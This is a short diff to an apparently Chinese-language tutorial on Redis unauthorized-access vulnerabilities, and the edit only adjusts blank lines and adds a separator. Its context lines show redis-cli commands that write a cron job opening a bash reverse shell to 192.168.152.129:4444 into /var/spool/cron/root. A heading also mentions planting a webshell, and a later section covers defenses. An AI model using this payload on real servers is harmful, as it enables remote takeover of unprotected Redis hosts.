@@ -127,7 +127,6 @@ set xxx "\n\n*/1 * * * * /bin/bash -i>&/dev/tcp/192.168.152.129/4444 0>&1\n\n"
 config set dir /var/spool/cron
 config set dbfilename root
 save
-
 ```
 
 #### 其他利用方式2：在web目录下写入webshell
@@ -172,6 +171,8 @@ return msg
 ![](/assets/redis-12.png)
 
 
+
+---
 
 ## 四. Redis未授权访问漏洞的防护
 
